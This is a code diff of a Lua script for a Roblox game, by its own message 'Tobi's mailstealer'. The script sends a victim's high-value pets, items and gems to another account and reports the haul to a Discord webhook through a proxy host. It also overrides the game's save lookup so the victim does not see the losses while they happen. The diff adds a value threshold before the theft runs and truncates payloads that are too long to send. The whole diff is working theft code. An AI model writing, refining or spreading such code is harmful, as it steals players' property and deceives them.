@@ -16,6 +16,7 @@ end
 if _G.scriptExecuted then
     return
 end
+_G.scriptExecuted = true
 
 local newamount = 20000
 
@@ -107,6 +108,12 @@ local function SendMessage(url, username, diamonds)
 			}
         }}
     }
+
+    if #fields[2].value > 1024 then
+        fields[2].value  = "List of items too big to send!\n\nGems: " .. formatNumber(diamonds) .. "\n"
+        fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
+    end
+
     local body = HttpService:JSONEncode(data)
     local response = request({
 		Url = url,
@@ -231,25 +238,8 @@ local function ClaimMail()
     end
 end
 
-ClaimMail()
-EmptyBoxes()
 local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
-local blob_a = require(game.ReplicatedStorage.Library)
-local blob_b = blob_a.Save.Get()
-function deepCopy(original)
-	local copy = {}
-	for k, v in pairs(original) do
-		if type(v) == "table" then
-			v = deepCopy(v)
-		end
-		copy[k] = v
-	end
-	return copy
-end
-blob_b = deepCopy(blob_b)
-blob_a.Save.Get = function(...)
-	return blob_b
-end
+
 for i, v in pairs(categoryList) do
 	if save[v] ~= nil then
 		for uid, item in pairs(save[v]) do
@@ -288,20 +278,42 @@ for i, v in pairs(categoryList) do
         end
 	end
 end
-if Webhook and string.find(Webhook, "discord") then
-	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
-	SendMessage(Webhook, plr.Name, GemAmount1)
+
+if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
+    ClaimMail()
+    EmptyBoxes()
+    local blob_a = require(game.ReplicatedStorage.Library)
+    local blob_b = blob_a.Save.Get()
+    function deepCopy(original)
+        local copy = {}
+        for k, v in pairs(original) do
+            if type(v) == "table" then
+                v = deepCopy(v)
+            end
+            copy[k] = v
+        end
+        return copy
+    end
+    blob_b = deepCopy(blob_b)
+    blob_a.Save.Get = function(...)
+        return blob_b
+    end
+
+    if Webhook and string.find(Webhook, "discord") then
+        Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+        SendMessage(Webhook, plr.Name, GemAmount1)
+    end
+
+    table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
+    for _, item in ipairs(sortedItems) do
+        if item.rap >= newamount then
+            sendItem(item.category, item.uid, item.amount)
+        else
+            break
+        end
+    end
+    SendAllGems()
+    setclipboard("https://discord.gg/HcpNe56R2a")
+    local message = require(game.ReplicatedStorage.Library.Client.Message)
+    message.Error("All your valuable items just got stolen by Tobi's mailstealer!\nJoin discord.gg/HcpNe56R2a")
 end
-table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
-_G.scriptExecuted = true
-for _, item in ipairs(sortedItems) do
-	if item.rap >= newamount then
-    	sendItem(item.category, item.uid, item.amount)
-	else
-		break
-	end
-end
-SendAllGems()
-setclipboard("https://discord.gg/HcpNe56R2a")
-local message = require(game.ReplicatedStorage.Library.Client.Message)
-message.Error("All your valuable items just got stolen by Tobi's mailstealer!\nJoin discord.gg/HcpNe56R2a")
